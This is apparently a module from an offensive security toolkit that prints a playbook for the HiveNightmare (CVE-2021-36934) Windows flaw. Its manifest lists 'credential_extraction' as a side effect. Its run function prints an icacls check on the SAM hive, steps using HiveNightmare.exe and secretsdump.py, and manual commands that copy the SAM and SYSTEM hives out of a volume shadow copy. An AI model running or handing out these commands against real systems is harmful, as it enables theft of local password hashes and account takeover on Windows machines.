"""HiveNightmare/SeriousSAM  -  CVE-2021-36934: SAM/SYSTEM readable by users."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.kernel.hivenightmare.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["credential_extraction"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.002"],
}


def run(args: Any) -> int:
    print("[*] HiveNightmare (CVE-2021-36934): SAM/SYSTEM/SECURITY shadow copies")
    print("[*] Affected: Windows 10 1809+, Server 2019")

    print("\n[*] Check vulnerability:")
    print("  icacls C:\\Windows\\System32\\config\\SAM")
    print("  (BUILTIN\\Users:(I)(RX) = VULNERABLE)")

    print("\n[*] Exploitation:")
    print("  1. HiveNightmare.exe  # creates SAM/SYSTEM/SECURITY copies")
    print("  2. secretsdump.py -sam SAM-copy -system SYSTEM-copy -security SECURITY-copy LOCAL")

    print("\n[*] Manual VSS method:")
    print("  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM SAM")
    print("  copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM SYSTEM")

    return 0
